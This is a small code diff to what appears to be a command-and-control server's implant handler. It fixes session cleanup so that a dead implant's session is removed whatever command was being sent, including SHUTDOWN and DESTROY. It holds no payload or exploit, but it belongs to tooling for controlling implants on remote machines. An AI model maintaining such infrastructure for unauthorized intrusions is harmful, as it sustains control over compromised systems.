@@ -167,9 +167,9 @@ def _handle_implant(conn, addr):
                 result_q.put({"status": "ok", "result": result})
             except (ConnectionError, OSError, BrokenPipeError) as exc:
                 log.info("  TASK     %s  %s  SOCKET_DEAD %s", implant_id, command, exc)
+                with _sessions_lock:
+                    _sessions.pop(implant_id, None)
                 if command in ("SHUTDOWN", "DESTROY"):
-                    with _sessions_lock:
-                        _sessions.pop(implant_id, None)
                     result_q.put({"status": "ok", "result": {"type": "RESPONSE", "payload": {"message": "implant disconnected"}}})
                 else:
                     result_q.put({"status": "error", "message": "socket closed: {0}".format(exc)})
